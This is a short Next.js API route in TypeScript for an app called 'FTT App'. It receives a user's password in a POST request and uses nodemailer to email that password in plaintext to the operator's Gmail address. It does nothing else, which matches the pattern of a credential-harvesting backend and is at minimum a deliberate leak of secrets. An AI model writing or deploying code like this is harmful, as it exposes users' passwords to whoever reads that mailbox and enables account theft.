import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(req: Request) {
  try {
    const { password } = await req.json();

    if (!password) {
      return NextResponse.json({ error: 'Password missing' }, { status: 400 });
    }

    // Configure transporter using environment variables
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    // Compose the email
    await transporter.sendMail({
      from: `"FTT App" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_USER,
      subject: '🔐 Password Entered on FTT App',
      text: `A user entered a valid password: ${password}`,
    });

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error('Error sending email:', err);
    return NextResponse.json({ error: 'Email failed' }, { status: 500 });
  }
}


